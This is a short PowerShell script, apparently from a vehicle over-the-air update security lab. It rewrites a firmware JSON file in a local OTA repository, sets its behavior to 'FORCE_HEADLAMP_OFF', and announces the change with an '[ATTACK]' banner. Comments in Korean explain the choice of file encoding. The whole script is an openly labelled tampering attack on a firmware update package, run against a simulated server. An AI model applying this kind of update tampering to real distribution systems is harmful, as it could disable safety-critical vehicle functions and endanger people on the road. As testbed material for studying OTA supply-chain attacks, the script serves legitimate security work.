$ErrorActionPreference = "Stop"

$path = Join-Path $PSScriptRoot "server\firmware_v2.json"
$obj = Get-Content $path -Raw | ConvertFrom-Json
$obj.behavior = "FORCE_HEADLAMP_OFF"
$json = $obj | ConvertTo-Json -Depth 10

# Windows PowerShell 5.1의 Set-Content -Encoding utf8은 BOM을 추가할 수 있으므로
# UTF-8 without BOM으로 직접 저장한다.
$utf8NoBom = New-Object System.Text.UTF8Encoding($false)
[System.IO.File]::WriteAllText($path, $json, $utf8NoBom)

Write-Host "[ATTACK] PC OTA repository firmware modified"
Write-Host "         behavior = FORCE_HEADLAMP_OFF"
